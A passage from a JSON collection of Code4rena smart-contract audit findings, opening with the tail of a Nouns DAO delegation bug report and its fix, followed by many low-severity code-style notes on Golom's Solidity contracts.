Differs from `_transferTokens()` to use `delegates` override method to simulate auto-delegation\n            _moveDelegates(delegates(from), delegates(to), 1);\n        }\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L126-L144>\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L88-L91>\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L97-L106>\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L197-L208>\n\n### Recommended Mitigation Steps\n\nConsider requiring in the `delegateBySig` function that delegatee cannot be address 0.\n\n```diff\n    function delegateBySig(\n        address delegatee,\n        uint256 nonce,\n        uint256 expiry,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public {\n+ require(delegatee != address(0));\n```\n**[eladmallel (Nouns DAO) confirmed and commented](https://github.com/code-423n4/2022-08-nounsdao-findings/issues/157#issuecomment-1232007061):**\n > We agree this is a bug that has existed since Nouns launched, and plan to fix the bug with the suggested requirement that delegatee should not be address(0).\n> \n> Worth noting that this fix will not have a positive effect on Nouns, as the token is already deployed and not upgradable. \n\n\n\n***\n\n \n",
      "summary": "\nA bug has been discovered in the ERC721Checkpointable contract, which allows users to vote to address 0 with the delegateBySig function. If a user does this, _delegates[A] will be address 0, but the delegates function will return the address of user A and getCurrentVotes(A) will return 0. Later, if the user votes to another address or transfers an NFT, the _moveDelegates function will fail due to overflow, which makes the user lose votes forever and prevents them from transferring the NFT.\n\nA proof of concept has been provided, and the recommended mitigation step is to require in the delegateBySig function that delegatee cannot be address 0. The Nouns DAO team has confirmed and commented that they agree this is a bug that has existed since Nouns launched, and plan to fix the bug with the suggested requirement.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/157",
      "tags": [],
      "finders": []
    },
    {
      "id": "23749",
      "title": "[N-22]  Duplicated `require()`/`revert()` checks should be refactored to a modifier or function",
      "impact": "LOW",
      "content": "The compiler will inline the function, which will avoid `JUMP` instructions usually associated with functions\n\n*There are 14 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n291:              require(msg.sender == o.reservedAddress);\n\n299:              require(amount == 1, 'only 1 erc721 at 1 time');\n\n349:          require(status == 3);\n\n350:          require(amountRemaining >= amount);\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L291\n\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n158:              require(epochs[index] < epoch);\n\n220:          require(address(ve) != address(0), ' VE not added yet');\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L158\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowCore.sol\n\n1008:         require(attachments[_tokenId] == 0 && !voted[_tokenId], 'attached');\n\n874:          require(msg.sender == voter);\n\n944:          require(_value > 0); // dev: need non-zero value\n\n982:          require(_locked.amount > 0, 'No existing lock found');\n\n983:          require(_locked.end > block.timestamp, 'Cannot add to expired lock. Withdraw');\n\n999:          require(unlock_time <= block.timestamp + MAXTIME, 'Voting lock can be 4 years max');\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1008\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowDelegation.sol\n\n211:          require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');\n\n186:          require(blockNumber < block.number, 'VEDelegation: not yet determined');\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L211\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23748",
      "title": "[N-21]  Event is missing `indexed` fields",
      "impact": "LOW",
      "content": "Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (threefields). Each `event` should use three `indexed` fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.\n\n*There are 7 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n79:       event NonceIncremented(address indexed maker, uint256 newNonce);\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L79\n\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n70:       event NewEpoch(uint256 indexed epochNo, uint256 tokenMinted, uint256 rewardStaker, uint256 previousEpochFee);\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L70\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowCore.sol\n\n67:       event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n\n284       event Deposit(\n285           address indexed provider,\n286           uint256 tokenId,\n287           uint256 value,\n288           uint256 indexed locktime,\n289           DepositType deposit_type,\n290           uint256 ts\n291:      );\n\n292:      event Withdraw(address indexed provider, uint256 tokenId, uint256 value, uint256 ts);\n\n293:      event Supply(uint256 prevSupply, uint256 supply);\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L67\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowDelegation.sol\n\n29:       event DelegateVotesChanged(address indexed delegate, uint256 previousBalance, uint256 newBalance);\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L29\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23747",
      "title": "[N-20]  File does not contain an SPDX Identifier",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/vote-escrow/TokenUriHelper.sol\n\n0:    /// [MIT License]\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/TokenUriHelper.sol#L0\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23746",
      "title": "[N-19]  Non-library/interface files should use fixed compiler versions, not floating ones",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/governance/GolomToken.sol\n\n2:    pragma solidity ^0.8.11;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/governance/GolomToken.sol#L2\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23745",
      "title": "[N-18]  Variable names that consist of all capital letters should be reserved for `constant`/`immutable` variables",
      "impact": "LOW",
      "content": "If the variable needs to be different based on which class it comes from, a `view`/`pure` _function_ should be used instead (e.g. like [this](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/76eee35971c2541585e05cbf258510dda7b2fbc6/contracts/token/ERC20/extensions/draft-IERC20Permit.sol#L59)).\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n45:       ERC20 WETH = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L45\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowDelegation.sol\n\n50:       uint256 public MIN_VOTING_POWER_REQUIRED = 0;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L50\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23744",
      "title": "[N-17]  Inconsistent method of specifying a floating pragma",
      "impact": "LOW",
      "content": "Some files use `>=`, some use `^`. The instances below are examples of the method that has the fewest instances for a specific version. Note that using `>=` without also specifying `<=` will lead to failures to compile, or external project incompatability, when the major version changes and there are breaking-changes, so `^` should be preferred regardless of the instance counts\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/governance/GolomToken.sol\n\n2:    pragma solidity ^0.8.11;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/governance/GolomToken.sol#L2\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23743",
      "title": "[N-16]  Lines are too long",
      "impact": "LOW",
      "content": "Usually lines in source code are limited to [80](https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width) characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over [164](https://github.com/aizatto/character-length) characters, the lines below should be split when they reach that length\n\n*There are 8 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n132:                          'order(address collection,uint256 tokenId,address signer,uint256 orderType,uint256 totalAmt,payment exchange,payment prePayment,bool isERC721,uint256 tokenAmt,uint256 refererrAmt,bytes32 root,address reservedAddress,uint256 nonce,uint256 deadline)payment(uint256 paymentAmt,address paymentAddress)'\n\n329:      ///      to send ether to that address on filling the order, Match an criteria order, ensuring that the supplied proof demonstrates inclusion of the tokenId in the associated merkle root, if root is 0 then any token can be used to fill the order\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L132\n\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n126:                      epochTotalFee[0] =  address(this).balance; // staking and trading rewards start at epoch 1, for epoch 0 all contract ETH balance is converted to staker rewards rewards.\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L126\n\n```solidity\nFile: contracts/vote-escrow/TokenUriHelper.sol\n\n72:           output = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"512\" height=\"468\" viewBox=\"0 0 512 468\" fill=\"none\"><g clip-path=\"url(#clip0_2_190)\"><rect width=\"512\" height=\"468\" rx=\"40\" fill=\"#232323\"/><g filter=\"url(#filter0_f_2_190)\"><ellipse cx=\"256.5\" cy=\"-132\" rx=\"164\" ry=\"381.5\" transform=\"rotate(-90 256.5 -132)\" fill=\"#FF8982\"/></g>';\n\n78:                   '</text><text y=\"318px\" x=\"54px\" fill=\"white\" font-family=\"Lexend Deca, sans-serif\" font-weight=\"400\" font-size=\"24px\" fill-opacity=\"0.64\">Locked Till</text>'\n\n86:                   '</text><text y=\"248px\" x=\"54px\" fill=\"white\" font-family=\"Lexend Deca, sans-serif\" font-weight=\"400\" font-size=\"24px\" fill-opacity=\"0.64\">Voting Power</text>'\n\n94:                   '</text><text y=\"391px\" x=\"54px\" fill=\"white\" font-family=\"Lexend Deca, sans-serif\" font-weight=\"400\" font-size=\"24px\" fill-opacity=\"0.64\">Value</text>'\n\n102:                  '</text><mask id=\"mask0_2_190\" style=\"mask-type:alpha\" maskUnits=\"userSpaceOnUse\" x=\"399\" y=\"73\" width=\"58\" height=\"58\"><path d=\"M456.543 102.091C456.543 117.884 443.74 130.686 427.948 130.686C412.155 130.686 399.352 117.884 399.352 102.091C399.352 86.2981 412.155 73.4955 427.948 73.4955C443.74 73.4955 456.543 86.2981 456.543 102.091ZM405.91 102.091C405.91 114.262 415.777 124.128 427.948 124.128C440.118 124.128 449.985 114.262 449.985 102.091C449.985 89.9201 440.118 80.0537 427.948 80.0537C415.777 80.0537 405.91 89.9201 405.91 102.091Z\" fill=\"#C4C4C4\"/></mask><g mask=\"url(#mask0_2_190)\"><path d=\"M458.138 73.4955H396.962V133.076H458.138V73.4955Z\" fill=\"#FD7A7A\"/><path d=\"M396.962 76.7614H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 80.266H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 83.7708H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 87.2754H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 90.7802H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 94.2848H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 97.7897H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 101.294H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 104.799H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 108.304H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 111.808H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 115.313H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 118.818H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 122.323H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 125.827H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/><path d=\"M396.962 129.332H458.138\" stroke=\"black\" stroke-width=\"0.328567\"/></g><mask id=\"mask1_2_190\" style=\"mask-type:alpha\" maskUnits=\"userSpaceOnUse\" x=\"399\" y=\"73\" width=\"58\" height=\"58\"><path d=\"M456.543 102.091C456.543 117.884 443.74 130.686 427.948 130.686C412.155 130.686 399.352 117.884 399.352 102.091C399.352 86.2981 412.155 73.4955 427.948 73.4955C443.74 73.4955 456.543 86.2981 456.543 102.091ZM405.91 102.091C405.91 114.262 415.777 124.128 427.948 124.128C440.118 124.128 449.985 114.262 449.985 102.091C449.985 89.9201 440.118 80.0537 427.948 80.0537C415.777 80.0537 405.91 89.9201 405.91 102.091Z\" fill=\"white\"/></mask><g mask=\"url(#mask1_2_190)\"><path d=\"M456.543 102.091C456.543 117.884 443.74 130.686 427.948 130.686C412.155 130.686 399.352 117.884 399.352 102.091C399.352 86.2981 412.155 73.4955 427.948 73.4955C443.74 73.4955 456.543 86.2981 456.543 102.091ZM405.91 102.091C405.91 114.262 415.777 124.128 427.948 124.128C440.118 124.128 449.985 114.262 449.985 102.091C449.985 89.9201 440.118 80.0537 427.948 80.0537C415.777 80.0537 405.91 89.9201 405.91 102.091Z\" stroke=\"black\" stroke-width=\"0.876179\"/><path d=\"M422.132 130.606H428.026\" stroke=\"black\" stroke-width=\"0.109522\"/><path d=\"M422.132 73.5752H428.026\" stroke=\"black\" stroke-width=\"0.109522\"/></g><mask id=\"mask2_2_190\" style=\"mask-type:alpha\" maskUnits=\"userSpaceOnUse\" x=\"393\" y=\"73\" width=\"58\" height=\"58\"><path d=\"M450.648 102.091C450.648 117.884 437.845 130.686 422.053 130.686C406.26 130.686 393.457 117.884 393.457 102.091C393.457 86.2981 406.26 73.4955 422.053 73.4955C437.845 73.4955 450.648 86.2981 450.648 102.091ZM400.015 102.091C400.015 114.262 409.882 124.128 422.053 124.128C434.223 124.128 444.09 114.262 444.09 102.091C444.09 89.9201 434.223 80.0537 422.053 80.0537C409.882 80.0537 400.015 89.9201 400.015 102.091Z\" fill=\"white\"/></mask><g mask=\"url(#mask2_2_190)\"><path d=\"M450.648 102.091C450.648 117.884 437.845 130.686 422.053 130.686C406.26 130.686 393.457 117.884 393.457 102.091C393.457 86.2981 406.26 73.4955 422.053 73.4955C437.845 73.4955 450.648 86.2981 450.648 102.091ZM400.015 102.091C400.015 114.262 409.882 124.128 422.053 124.128C434.223 124.128 444.09 114.262 444.09 102.091C444.09 89.9201 434.223 80.0537 422.053 80.0537C409.882 80.0537 400.015 89.9201 400.015 102.091Z\" fill=\"white\" stroke=\"black\" stroke-width=\"0.876179\"/></g></g><defs><filter id=\"filter0_f_2_190\" x=\"-381\" y=\"-552\" width=\"1275\" height=\"840\" filterUnits=\"userSpaceOnUse\" color-interpolation-filters=\"sRGB\"><feFlood flood-opacity=\"0\" result=\"BackgroundImageFix\"/><feBlend mode=\"normal\" in=\"SourceGraphic\" in2=\"BackgroundImageFix\" result=\"shape\"/><feGaussianBlur stdDeviation=\"128\" result=\"effect1_foregroundBlur_2_190\"/></filter><clipPath id=\"clip0_2_190\"><rect width=\"512\" height=\"468\" rx=\"40\" fill=\"white\"/></clipPath></defs></svg>'\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/TokenUriHelper.sol#L72\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23742",
      "title": "[N-15]  Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`)",
      "impact": "LOW",
      "content": "While the compiler knows to optimize away the exponentiation, it's still better coding practice to use idioms that do not require compiler optimization, if they exist\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n48:       uint256 constant dailyEmission = 600000 * 10**18;\n\n100:          if (rewardToken.totalSupply() > 1000000000 * 10**18) {\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L48\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23741",
      "title": "[N-14]  Use a more recent version of solidity",
      "impact": "LOW",
      "content": "Use a solidity version of at least 0.8.12 to get `string.concat()` to be used instead of `abi.encodePacked(<str>,<str>)`\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n3:    pragma solidity 0.8.11;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L3\n\n```solidity\nFile: contracts/vote-escrow/TokenUriHelper.sol\n\n3:    pragma solidity 0.8.11;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/TokenUriHelper.sol#L3\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23740",
      "title": "[N-13]  Large multiples of ten should use scientific notation (e.g. `1e6`) rather than decimal literals (e.g. `1000000`), for readability",
      "impact": "LOW",
      "content": "\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n100:          if (rewardToken.totalSupply() > 1000000000 * 10**18) {\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L100\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowCore.sol\n\n308:      mapping(uint256 => Point[1000000000]) public user_point_history; // user -> Point[user_epoch]\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L308\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23739",
      "title": "[N-12]  Numeric values having to do with time should use time units for readability",
      "impact": "LOW",
      "content": "There are [units](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#time-units) for seconds, minutes, hours, days, and weeks, and since they're defined, they should be used\n\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n/// @audit 600000\n48:       uint256 constant dailyEmission = 600000 * 10**18;\n\n/// @audit 60\n/// @audit 60\n57:       uint256 constant secsInDay = 24 * 60 * 60;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L48\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowCore.sol\n\n/// @audit 86400\n296:      uint256 internal constant MAXTIME = 4 * 365 * 86400;\n\n/// @audit 86400\n297:      int128 internal constant iMAXTIME = 4 * 365 * 86400;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L296\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23738",
      "title": "[N-11]  `constant`s should be defined rather than using magic numbers",
      "impact": "LOW",
      "content": "Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals\n\n*There are 49 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n/// @audit 50\n/// @audit 10000\n212:              o.totalAmt >= o.exchange.paymentAmt + o.prePayment.paymentAmt + o.refererrAmt + (o.totalAmt * 50) / 10000,\n\n/// @audit 3\n226:          require(status == 3, 'order not valid');\n\n/// @audit 50\n/// @audit 10000\n242:          payEther(((o.totalAmt * 50) / 10000) * amount, address(distributor));\n\n/// @audit 50\n254:                      (o.totalAmt * 50) /\n\n/// @audit 10000\n255:                      10000 -\n\n/// @audit 50\n/// @audit 10000\n263:                  (o.totalAmt - (o.totalAmt * 50) / 10000 - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount,\n\n/// @audit 50\n/// @audit 10000\n269:          distributor.addFee([o.signer, o.exchange.paymentAddress], ((o.totalAmt * 50) / 10000) * amount);\n\n/// @audit 3\n295:          require(status == 3);\n\n/// @audit 3\n349:          require(status == 3);\n\n/// @audit 50\n/// @audit 10000\n381:          uint256 protocolfee = ((o.totalAmt * 50) / 10000) * amount;\n\n/// @audit 0x00\n436:              mstore(0x00, a)\n\n/// @audit 0x20\n437:              mstore(0x20, b)\n\n/// @audit 0x00\n/// @audit 0x40\n438:              value := keccak256(0x00, 0x40)\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L212\n\n```solidity\nFile: contracts/governance/GolomToken.sol\n\n/// @audit 150_000_000\n/// @audit 1e18\n44:           _mint(_airdrop, 150_000_000 * 1e18);\n\n/// @audit 62_500_000\n/// @audit 1e18\n52:           _mint(_rewardDistributor, 62_500_000 * 1e18);\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/governance/GolomToken.sol#L44\n\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n/// @audit 1659211200\n84:           startTime = 1659211200;\n\n/// @audit 1000000000\n/// @audit 18\n100:          if (rewardToken.totalSupply() > 1000000000 * 10**18) {\n\n/// @audit 67\n/// @audit 100\n120:              rewardTrader[epoch] = ((tokenToEmit - stakerReward) * 67) / 100;\n\n/// @audit 33\n/// @audit 100\n121:              rewardExchange[epoch] = ((tokenToEmit - stakerReward) * 33) / 100;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L84\n\n```solidity\nFile: contracts/vote-escrow/TokenUriHelper.sol\n\n/// @audit 4\n/// @audit 3\n17:           uint256 encodedLen = 4 * ((len + 2) / 3);\n\n/// @audit 32\n20:           bytes memory result = new bytes(encodedLen + 32);\n\n/// @audit 0xffffff\n34:                   let input := and(mload(add(data, i)), 0xffffff)\n\n/// @audit 0x3F\n36:                   let out := mload(add(tablePtr, and(shr(18, input), 0x3F)))\n\n/// @audit 0x3F\n/// @audit 0xFF\n38:                   out := add(out, and(mload(add(tablePtr, and(shr(12, input), 0x3F))), 0xFF))\n\n/// @audit 0x3F\n/// @audit 0xFF\n40:                   out := add(out, and(mload(add(tablePtr, and(shr(6, input), 0x3F))), 0xFF))\n\n/// @audit 0x3F\n/// @audit 0xFF\n42:                   out := add(out, and(mload(add(tablePtr, and(input, 0x3F))), 0xFF))\n\n/// @audit 0x3d3d\n52:                   mstore(sub(resultPtr, 2), shl(240, 0x3d3d))\n\n/// @audit 0x3d\n55:                   mstore(sub(resultPtr, 1), shl(248, 0x3d))\n\n/// @audit 48\n144:              buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/TokenUriHelper.sol#L17\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowCore.sol\n\n/// @audit 255\n745:              for (uint256 i = 0; i < 255; ++i) {\n\n/// @audit 128\n1044:         for (uint256 i = 0; i < 128; ++i) {\n\n/// @audit 128\n1115:         for (uint256 i = 0; i < 128; ++i) {\n\n/// @audit 255\n1167:         for (uint256 i = 0; i < 255; ++i) {\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L745\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowDelegation.sol\n\n/// @audit 500\n99:           require(_delegatedTokenIds.length < 500, 'VVDelegation: Cannot stake more');\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L99\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23737",
      "title": "[N-10]  Non-assembly method available",
      "impact": "LOW",
      "content": "`assembly{ id := chainid() }` => `uint256 id = block.chainid`, `assembly { size := extcodesize() }` => `uint256 size = address().code.length`<br>\nThere are some automated tools that will flag a project as having higher complexity if there is inline-assembly, so it's best to avoid using it where it's not necessary.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n98:               chainId := chainid()\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L98\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowCore.sol\n\n577:              size := extcodesize(account)\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L577\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23736",
      "title": "[N-09]  `public` functions not called by the contract should be declared `external` instead",
      "impact": "LOW",
